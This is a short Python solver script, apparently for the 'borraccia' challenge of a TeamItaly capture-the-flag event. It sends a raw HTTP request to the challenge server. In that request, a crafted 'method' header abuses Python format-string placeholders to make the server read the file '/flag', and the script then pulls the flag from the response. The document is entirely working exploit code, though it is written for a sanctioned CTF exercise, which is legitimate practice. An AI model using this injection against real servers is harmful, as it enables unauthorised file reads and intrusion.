#!/bin/python3

import re
import os
import requests
from pwn import *
import logging
logging.disable()

# Se challenge tcp
HOST = os.environ.get("HOST", "borraccia.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 80))

# Check challenge
filename = "/flag"

payload = """GET /?a=%%&b=(&c=) HTTP/1.1
Host: %s
status-code: %s
method: {0[request][params][a]}{0[request][params][b]}{0[response][body]}{0[request][params][c]}

""".replace("\n", "\r\n") % (HOST, filename)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))
sock.send(payload.encode())

print(re.search(r"<!--'(flag{.+})'-->", sock.recv(65536).decode()).group(1))

sock.close()
